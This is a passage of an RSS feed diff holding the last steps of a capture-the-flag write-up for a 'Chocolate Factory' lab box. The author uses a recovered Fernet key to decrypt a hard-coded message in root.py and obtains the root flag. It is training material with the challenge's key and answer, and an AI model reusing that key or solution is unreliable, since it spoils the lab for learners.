+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;display2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The content of &lt;em&gt;root.py&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;We already have a key from the binary key_rev_key.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;b&amp;rsquo;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&amp;rsquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;So, we can fix this code since that way, it&amp;rsquo;s easier to pass the byte string to the &lt;code&gt;key&lt;/code&gt; variable. Also, the original code yields some errors.&lt;/p&gt;
+&lt;p&gt;Modified code:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;cryptography.fernet&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Fernet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pyfiglet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#key=input(&amp;#34;Enter the key:  &amp;#34;) &amp;lt;&amp;lt; change this&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# to this&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Fernet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;encrypted_mess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#dcrypt_mess=f.decrypt(encrypted_mess) &amp;lt;&amp;lt; change this&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;dcrypt_mess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encrypted_mess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# to this. f.decrypt(token) &amp;lt;&amp;lt; token has to be in byte format&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;mess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dcrypt_mess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;display1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pyfiglet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;figlet_format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;You Are Now The Owner Of &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;display2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pyfiglet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;figlet_format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Chocolate Factory &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;display1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;display2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Run root.py&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sudo-echo-jin.github.io/p/chocolate/d4.png&#34;
+	width=&#34;832&#34;
+	height=&#34;701&#34;
+	
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;118&#34;
+		data-flex-basis=&#34;284px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;You are now the owner of chocolate factory&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;And we got a root flag.&lt;/p&gt;
+&lt;p&gt;Chocolate Factory pwned.&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
